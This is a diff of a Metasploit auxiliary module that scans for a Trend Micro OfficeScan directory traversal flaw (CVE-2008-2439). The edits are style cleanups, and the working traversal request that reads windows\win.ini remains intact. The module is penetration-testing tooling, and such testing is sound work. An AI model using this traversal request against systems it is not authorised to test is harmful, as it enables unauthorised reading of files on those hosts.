@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
 
@@ -24,7 +24,7 @@ class MetasploitModule < Msf::Auxiliary
           [ 'OSVDB', '48730' ],
           [ 'CVE', '2008-2439' ],
           [ 'BID', '31531' ],
-          [ 'URL', 'http://www.trendmicro.com/ftp/documentation/readme/OSCE_7.3_Win_EN_CriticalPatch_B1372_Readme.txt' ],
+          [ 'URL', 'http://www.trendmicro.com/ftp/documentation/readme/OSCE_7.3_Win_EN_CriticalPatch_B1372_Readme.txt' ]
         ],
       'Author'      => [ 'Anshul Pandey <anshul999[at]gmail.com>', 'patrick' ],
       'License'     => MSF_LICENSE
@@ -32,32 +32,33 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        Opt::RPORT(26122),
-      ], self.class)
+        Opt::RPORT(26122)
+      ], self.class
+    )
   end
 
   def run_host(target_host)
-
     res = send_request_raw(
       {
         'uri'     => '/activeupdate/../../../../../../../../../../../windows\\win.ini',
-        'method'  => 'GET',
-      }, 20)
+        'method'  => 'GET'
+      }, 20
+    )
 
-    if not res
+    unless res
       print_error("No response from server")
       return
     end
 
-    http_fingerprint({ :response => res })
+    http_fingerprint(response: res)
 
-    if (res.code >= 200)
-      if (res.body =~ /for 16-bit app support/)
-        vuln = "vulnerable."
-      else
-        vuln = "not vulnerable."
-      end
-      if (res.headers['Server'])
+    if res.code >= 200
+      vuln = if res.body =~ /for 16-bit app support/
+               "vulnerable."
+             else
+               "not vulnerable."
+             end
+      if res.headers['Server']
         print_status("http://#{target_host}:#{rport} is running #{res.headers['Server']} and is #{vuln}")
       end
     end
